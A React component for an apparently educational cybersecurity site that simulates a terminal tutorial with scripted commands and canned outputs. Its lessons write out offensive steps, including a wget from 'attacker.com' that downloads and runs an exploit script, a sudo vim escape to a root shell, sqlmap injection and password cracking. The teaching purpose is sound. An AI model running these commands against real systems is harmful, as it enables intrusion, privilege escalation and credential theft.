import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Wifi, Shield, ChevronRight, RotateCcw, Play } from 'lucide-react';
import SectionTitle from './SectionTitle';

const tutorials = [
  {
    id: 'linux',
    icon: Terminal,
    label: 'Linux Basics',
    description: 'Essential Linux commands every hacker needs',
    steps: [
      { cmd: 'whoami', output: 'root\n\n# This shows your current user. In CTFs, getting root = winning.', hint: 'Type: whoami' },
      { cmd: 'ls -la', output: 'total 48\ndrwxr-xr-x  8 root root 4096 Jan  1 00:00 .\ndrwxr-xr-x 20 root root 4096 Jan  1 00:00 ..\n-rw-------  1 root root  512 Jan  1 00:00 .bash_history\n-rw-r--r--  1 root root  220 Jan  1 00:00 .bashrc\ndrwx------  2 root root 4096 Jan  1 00:00 .ssh\n-rw-r--r--  1 root root   33 Jan  1 00:00 flag.txt\n\n# -la shows hidden files (starting with .) and permissions.', hint: 'Type: ls -la' },
      { cmd: 'cat flag.txt', output: 'flag{linux_is_the_way}\n\n# cat reads file contents. Always check flag.txt in CTFs!', hint: 'Type: cat flag.txt' },
      { cmd: 'find / -name "*.txt" 2>/dev/null', output: '/root/flag.txt\n/var/www/html/robots.txt\n/home/user/notes.txt\n\n# find searches the entire system. 2>/dev/null hides permission errors.', hint: 'Type: find / -name "*.txt" 2>/dev/null' },
      { cmd: 'chmod +x exploit.sh && ./exploit.sh', output: '[*] Starting exploit...\n[+] Vulnerability found in service v1.2\n[+] Payload injected successfully\n[+] Shell obtained!\n\n# chmod +x makes a file executable. Then ./ runs it.', hint: 'Type: chmod +x exploit.sh && ./exploit.sh' },
    ],
  },
  {
    id: 'nmap',
    icon: Wifi,
    label: 'Network Scanning',
    description: 'Discover hosts and open ports with Nmap',
    steps: [
      { cmd: 'nmap 192.168.1.1', output: 'Starting Nmap 7.94\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n443/tcp open https\n\n# Basic scan. Shows open ports — entry points.', hint: 'Type: nmap 192.168.1.1' },
      { cmd: 'nmap -sV -sC 192.168.1.1', output: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1\n| ssh-hostkey: RSA 2048 ...\n80/tcp open  http    Apache httpd 2.4.54\n|_http-title: Admin Panel\n\n# -sV detects versions. -sC runs default scripts. Versions reveal vulnerabilities!', hint: 'Type: nmap -sV -sC 192.168.1.1' },
      { cmd: 'nmap -p- --min-rate 5000 192.168.1.1', output: 'Scanning all 65535 ports...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n31337/tcp open  Elite\n\n# -p- scans ALL ports. Admins often hide services on weird ports.', hint: 'Type: nmap -p- --min-rate 5000 192.168.1.1' },
      { cmd: 'nmap --script vuln 192.168.1.1', output: 'PORT   STATE SERVICE\n80/tcp open  http\n| http-vuln-cve2021-41773:\n|   VULNERABLE:\n|   Path Traversal and RCE in Apache 2.4.49\n|     CVE: CVE-2021-41773\n|     State: VULNERABLE\n\n# Nmap has vulnerability scripts! Always check for known CVEs.', hint: 'Type: nmap --script vuln 192.168.1.1' },
    ],
  },
  {
    id: 'exploits',
    icon: Shield,
    label: 'Recon & Exploits',
    description: 'Basic concepts for CTF exploitation',
    steps: [
      { cmd: 'curl -I http://target.com', output: 'HTTP/1.1 200 OK\nServer: Apache/2.4.49\nX-Powered-By: PHP/7.4.0\nX-Frame-Options: SAMEORIGIN\nContent-Type: text/html\n\n# HTTP headers reveal server tech. PHP 7.4.0? Check for known exploits!', hint: 'Type: curl -I http://target.com' },
      { cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt', output: '/admin         (Status: 200)\n/backup        (Status: 403)\n/config.php    (Status: 200)\n/uploads       (Status: 301)\n/.git          (Status: 200) ← JACKPOT\n\n# Directory busting finds hidden pages. .git exposed = source code leak!', hint: 'Type: gobuster dir ...' },
      { cmd: "sqlmap -u 'http://target.com/login?id=1' --dbs", output: "[*] Testing connection...\n[+] Parameter 'id' is vulnerable to SQL injection!\n[*] Fetching databases:\n    information_schema\n    mysql\n    users_db  ← target\n\n# SQLMap automates SQL injection. Databases = stored credentials.", hint: "Type: sqlmap -u '...' --dbs" },
      { cmd: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"', output: 'root@victim:/# \n\n# After getting a shell, upgrade it with PTY for full interactivity.\n# Now you have a proper terminal on the target machine!', hint: 'Type: python3 -c "import pty..."' },
    ],
  },
  {
    id: 'encryption',
    icon: Shield,
    label: 'Cryptography 101',
    description: 'Learn encryption and decryption techniques',
    steps: [
      { cmd: 'echo "secret" | base64', output: 'c2VjcmV0Cg==\n\n# Base64 encoding is NOT encryption — just encoding. Easily reversible!', hint: 'Type: echo "secret" | base64' },
      { cmd: 'echo "c2VjcmV0Cg==" | base64 -d', output: 'secret\n\n# -d flag decodes base64. Many CTF flags are hidden this way.', hint: 'Type: echo "c2VjcmV0Cg==" | base64 -d' },
      { cmd: 'echo "password123" | md5sum', output: '482c811da5d5b4bc6d497ffa98491e38  -\n\n# MD5 creates a hash. It\'s one-way — you can\'t reverse it (but rainbow tables exist!).', hint: 'Type: echo "password123" | md5sum' },
      { cmd: 'openssl enc -aes-256-cbc -in secret.txt -out encrypted.bin -k mykey', output: '[*] Encrypting secret.txt...\n[+] File encrypted successfully!\n\n# AES-256 is strong encryption. Without the key, data is unreadable.', hint: 'Type: openssl enc -aes-256-cbc ...' },
      { cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt', output: '[*] Loaded 1 password hash\n[*] Press Ctrl-C to abort\nadmin            (hash)\n\n# John the Ripper cracks password hashes using wordlists. Always secure your passwords!', hint: 'Type: john --wordlist=... hash.txt' },
    ],
  },
  {
    id: 'privesc',
    icon: Terminal,
    label: 'Privilege Escalation',
    description: 'Gain root access from limited user',
    steps: [
      { cmd: 'sudo -l', output: 'User may run the following commands:\n    (ALL) NOPASSWD: /usr/bin/vim\n\n# Check what you can run as sudo. Vim with sudo = easy root!', hint: 'Type: sudo -l' },
      { cmd: 'find / -perm -4000 2>/dev/null', output: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/bin/mount\n\n# SUID binaries run with owner permissions. Exploitable ones = privilege escalation!', hint: 'Type: find / -perm -4000 2>/dev/null' },
      { cmd: 'cat /etc/crontab', output: '* * * * * root /home/user/backup.sh\n\n# Cron jobs run automatically. If you can edit backup.sh, you can run code as root!', hint: 'Type: cat /etc/crontab' },
      { cmd: 'sudo vim -c ":!/bin/bash"', output: 'root@machine:/# whoami\nroot\n\n# Vim escape! Using :! in vim spawns a shell. With sudo, you get root shell.', hint: 'Type: sudo vim -c ":!/bin/bash"' },
      { cmd: 'wget http://attacker.com/exploit.sh && chmod +x exploit.sh && ./exploit.sh', output: '[*] Downloading kernel exploit...\n[+] Compiling...\n[+] Running exploit...\n[+] Root shell obtained!\nroot@machine:/# \n\n# Kernel exploits leverage OS vulnerabilities. Keep systems patched!', hint: 'Type: wget ... && chmod +x ... && ./...' },
    ],
  },
];

export default function InteractiveTutorials({ theme = 'dark', reducedMotion = false, onTutorialComplete }) {
  const [activeTutorial, setActiveTutorial] = useState(tutorials[0]);
  const [currentStep, setCurrentStep] = useState(0);
  const [userInput, setUserInput] = useState('');
  const [completedTutorials, setCompletedTutorials] = useState(new Set());
  const [terminalHistory, setTerminalHistory] = useState([
    { type: 'info', text: `# Welcome to KARCHON Interactive Terminal` },
    { type: 'info', text: `# Select a tutorial and type the commands to learn!` },
    { type: 'info', text: `# Current mission: ${tutorials[0].steps[0].hint}` },
  ]);
  const [shake, setShake] = useState(false);
  const inputRef = useRef(null);
  const historyRef = useRef(null);

  useEffect(() => {
    if (historyRef.current) {
      historyRef.current.scrollTop = historyRef.current.scrollHeight;
    }
  }, [terminalHistory]);

  const handleTutorialChange = (t) => {
    setActiveTutorial(t);
    setCurrentStep(0);
    setUserInput('');
    setTerminalHistory([
      { type: 'info', text: `# Switched to: ${t.label}` },
      { type: 'info', text: `# ${t.description}` },
      { type: 'info', text: `# ${t.steps[0].hint}` },
    ]);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const step = activeTutorial.steps[currentStep];
    const trimmed = userInput.trim();

    const newHistory = [...terminalHistory, { type: 'input', text: `$ ${trimmed}` }];

    if (trimmed === step.cmd || trimmed.split(' ')[0] === step.cmd.split(' ')[0]) {
      newHistory.push({ type: 'output', text: step.output });
      const next = currentStep + 1;
      if (next < activeTutorial.steps.length) {
        newHistory.push({ type: 'info', text: `# Next: ${activeTutorial.steps[next].hint}` });
        setCurrentStep(next);
      } else {
        newHistory.push({ type: 'success', text: `# ✓ Tutorial complete! You mastered: ${activeTutorial.label}` });
        
        // Mark as completed
        const updated = new Set(completedTutorials);
        updated.add(activeTutorial.id);
        setCompletedTutorials(updated);
        if (onTutorialComplete) {
          onTutorialComplete(updated.size);
        }
      }
    } else {
      newHistory.push({ type: 'error', text: `bash: ${trimmed}: command not recognized in this context` });
      newHistory.push({ type: 'info', text: `# Hint: ${step.hint}` });
      setShake(true);
      setTimeout(() => setShake(false), 500);
    }

    setTerminalHistory(newHistory);
    setUserInput('');
  };

  const reset = () => {
    setCurrentStep(0);
    setUserInput('');
    setTerminalHistory([
      { type: 'info', text: `# Tutorial reset: ${activeTutorial.label}` },
      { type: 'info', text: `# ${activeTutorial.steps[0].hint}` },
    ]);
  };

  const autoFill = () => {
    setUserInput(activeTutorial.steps[currentStep].cmd);
    inputRef.current?.focus();
  };

  const dark = theme === 'dark';

  return (
    <section className="relative py-24 px-4 md:px-8">
      <div className="max-w-6xl mx-auto">
        <SectionTitle title="INTERACTIVE_LABS" subtitle="// Learn by doing — hands-on cybersecurity" theme={theme} />

        {/* Tutorial selector */}
        <div className="flex flex-wrap gap-3 mb-8 justify-center">
          {tutorials.map((t) => {
            const Icon = t.icon;
            const active = activeTutorial.id === t.id;
            return (
              <motion.button
                key={t.id}
                onClick={() => handleTutorialChange(t)}
                whileHover={{ scale: 1.03 }}
                whileTap={{ scale: 0.97 }}
                className={`flex items-center gap-2 px-5 py-2.5 rounded-lg font-mono text-sm border transition-all duration-200 relative ${
                  active
                    ? dark ? 'bg-white text-black border-white' : 'bg-black text-white border-black'
                    : dark ? 'bg-gray-900 text-gray-400 border-gray-700 hover:border-gray-500' : 'bg-gray-100 text-gray-600 border-gray-300 hover:border-gray-500'
                }`}
              >
                <Icon className="w-4 h-4" />
                {t.label}
                {completedTutorials.has(t.id) && (
                  <span className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full flex items-center justify-center text-[10px] text-white">✓</span>
                )}
              </motion.button>
            );
          })}
        </div>

        <div className="grid lg:grid-cols-3 gap-6">
          {/* Steps panel */}
          <div className={`rounded-xl border p-5 ${dark ? 'bg-[#0d0d18] border-gray-700' : 'bg-gray-50 border-gray-200'}`}>
            <p className={`font-mono text-xs mb-4 ${dark ? 'text-gray-500' : 'text-gray-500'}`}>// MISSION STEPS</p>
            <div className="space-y-3">
              {activeTutorial.steps.map((step, i) => (
                <div
                  key={i}
                  className={`flex items-start gap-3 p-3 rounded-lg border transition-all ${
                    i === currentStep
                      ? dark ? 'bg-white/10 border-white/30' : 'bg-black/5 border-black/20'
                      : i < currentStep
                      ? dark ? 'border-gray-700 opacity-50' : 'border-gray-200 opacity-50'
                      : dark ? 'border-gray-800 opacity-30' : 'border-gray-100 opacity-30'
                  }`}
                >
                  <div className={`w-5 h-5 rounded-full flex items-center justify-center text-xs font-mono flex-shrink-0 mt-0.5 ${
                    i < currentStep ? 'bg-green-500 text-black' : i === currentStep ? dark ? 'bg-white text-black' : 'bg-black text-white' : dark ? 'bg-gray-800 text-gray-500' : 'bg-gray-200 text-gray-400'
                  }`}>
                    {i < currentStep ? '✓' : i + 1}
                  </div>
                  <div>
                    <p className={`font-mono text-xs ${dark ? 'text-gray-300' : 'text-gray-700'}`}>{step.hint}</p>
                    {i === currentStep && (
                      <motion.button
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        onClick={autoFill}
                        className={`mt-1 flex items-center gap-1 text-xs font-mono opacity-60 hover:opacity-100 transition-opacity ${dark ? 'text-gray-400' : 'text-gray-600'}`}
                      >
                        <Play className="w-3 h-3" /> autofill
                      </motion.button>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Terminal */}
          <div className="lg:col-span-2">
            <motion.div
              animate={shake ? { x: [-8, 8, -6, 6, 0] } : {}}
              transition={{ duration: 0.4 }}
              className={`rounded-xl border overflow-hidden ${dark ? 'bg-[#0a0a0a] border-gray-700' : 'bg-gray-900 border-gray-600'}`}
            >
              {/* Terminal header */}
              <div className={`flex items-center justify-between px-4 py-2 border-b ${dark ? 'bg-gray-900 border-gray-800' : 'bg-gray-800 border-gray-700'}`}>
                <div className="flex items-center gap-2">
                  <div className="flex gap-1.5">
                    <div className="w-3 h-3 rounded-full bg-red-500/70" />
                    <div className="w-3 h-3 rounded-full bg-yellow-500/70" />
                    <div className="w-3 h-3 rounded-full bg-green-500/70" />
                  </div>
                  <span className="text-xs font-mono text-gray-400 ml-2">karchon@lab:~</span>
                </div>
                <button onClick={reset} className="text-gray-500 hover:text-gray-300 transition-colors">
                  <RotateCcw className="w-3.5 h-3.5" />
                </button>
              </div>

              {/* Terminal body */}
              <div
                ref={historyRef}
                className="p-4 font-mono text-sm h-80 overflow-y-auto space-y-1"
                style={{ scrollbarWidth: 'thin', scrollbarColor: '#374151 transparent' }}
              >
                {terminalHistory.map((entry, i) => (
                  <div
                    key={i}
                    className={
                      entry.type === 'input' ? 'text-white' :
                      entry.type === 'output' ? 'text-gray-300 whitespace-pre-wrap' :
                      entry.type === 'error' ? 'text-red-400' :
                      entry.type === 'success' ? 'text-green-400' :
                      'text-gray-500'
                    }
                  >
                    {entry.text}
                  </div>
                ))}
              </div>

              {/* Input */}
              <form onSubmit={handleSubmit} className={`flex items-center gap-2 px-4 py-3 border-t ${dark ? 'border-gray-800' : 'border-gray-700'}`}>
                <span className="text-green-400 font-mono text-sm flex-shrink-0">$</span>
                <input
                  ref={inputRef}
                  type="text"
                  value={userInput}
                  onChange={(e) => setUserInput(e.target.value)}
                  placeholder="type your command..."
                  className="flex-1 bg-transparent font-mono text-sm text-white placeholder:text-gray-600 outline-none"
                  autoComplete="off"
                  spellCheck="false"
                />
                <motion.button
                  type="submit"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  className="flex items-center gap-1 px-3 py-1 text-xs font-mono bg-white text-black rounded hover:bg-gray-200 transition-colors"
                >
                  <ChevronRight className="w-3 h-3" />
                  RUN
                </motion.button>
              </form>
            </motion.div>

            <p className={`text-xs font-mono mt-3 text-center ${dark ? 'text-gray-600' : 'text-gray-400'}`}>
              // Simulated environment — safe to experiment
            </p>
          </div>
        </div>
      </div>
    </section>
  );
}